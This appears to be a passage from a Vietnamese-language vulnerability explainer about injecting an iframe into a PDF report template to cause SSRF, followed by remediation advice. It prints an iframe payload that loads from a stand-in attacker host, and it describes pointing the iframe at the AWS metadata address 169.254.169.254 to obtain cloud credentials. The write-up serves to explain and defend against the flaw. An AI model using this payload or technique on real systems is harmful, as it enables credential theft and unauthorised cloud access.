

### Ví dụ về việc chèn `<iframe>` vào template phần tử:

Giả sử ứng dụng cho phép người dùng gửi yêu cầu tạo báo cáo PDF, và người dùng có thể chèn các mẫu dữ liệu vào thông qua một hệ thống đầu vào không được kiểm tra. Kẻ tấn công có thể lợi dụng tính năng này để chèn mã độc, cụ thể là thẻ `<iframe>`, vào trong phần tử template.


#### Chèn mã độc vào `template`:

Kẻ tấn công có thể chèn vào một `iframe` độc hại trong giá trị của `element[:template]`, ví dụ:

```html
<iframe src="http://attacker.com/malicious_script"></iframe>
```

Khi mã này được xử lý mà không được kiểm tra vệ sinh đúng cách, nó sẽ được đưa vào báo cáo phân tích, và iframe sẽ được tải từ địa chỉ của kẻ tấn công.

#### Tác động:

* **Lợi dụng SSRF**: Kẻ tấn công có thể thay đổi `src` của `iframe` thành một địa chỉ nội bộ AWS (như `169.254.169.254`) để truy cập vào các thông tin xác thực AWS nội bộ.
* **Truy cập trái phép**: Địa chỉ nội bộ có thể cung cấp thông tin xác thực AWS, giúp kẻ tấn công truy cập trái phép vào các dịch vụ AWS của hệ thống.

### Cách khắc phục:

1. **Vệ sinh dữ liệu đầu vào**: Không cho phép chèn HTML hoặc iframe vào dữ liệu đầu vào. Xử lý mọi mẫu dữ liệu từ người dùng bằng cách lọc sạch các thẻ HTML không an toàn.
2. **Kiểm tra URL nguồn**: Nếu ứng dụng cho phép nhập URL, chỉ cho phép URL hợp lệ, tránh những địa chỉ IP nội bộ hay các URL không an toàn.
3. **Cấu hình bảo mật AWS**: Đảm bảo rằng các dịch vụ AWS sử dụng cơ chế kiểm tra quyền truy cập nghiêm ngặt, tránh để lộ thông tin xác thực nội bộ.

Lỗ hổng SSRF này có thể dẫn đến nhiều nguy cơ nghiêm trọng, vì vậy việc xử lý đầu vào đúng cách là rất quan trọng để bảo vệ ứng dụng và hệ thống.
